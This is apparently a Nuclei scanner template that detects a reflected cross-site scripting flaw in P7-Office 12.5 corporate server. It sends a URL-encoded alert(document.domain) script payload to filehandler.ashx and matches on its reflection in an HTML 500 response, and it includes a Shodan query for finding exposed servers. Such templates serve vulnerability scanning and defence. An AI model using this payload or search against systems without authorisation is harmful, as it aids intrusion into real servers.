http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'Can not convert id:'
    - <script>alert(document.domain)</script>
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 500
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Products/Files/HttpHandlers/filehandler.ashx?action=thumb&fileid=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
id: p7-office-xss
info:
  author: 0xpugal
  description: 'A failure to implement proper measures to protect the structure of
    the web page in the P7-Office corporate server could have allowed a remote attacker
    to perform a cross-site scripting (XSS) attack.

    '
  metadata:
    max-request: 1
    shodan-query: "title:\"\u04207-\u041E\u0444\u0438\u0441\""
    verified: true
  name: "\u04207-Office 12.5 - Cross-Site Scripting"
  reference:
  - https://bdu.fstec.ru/vul/2024-04635
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  severity: medium
  tags: p7office,xss,vuln
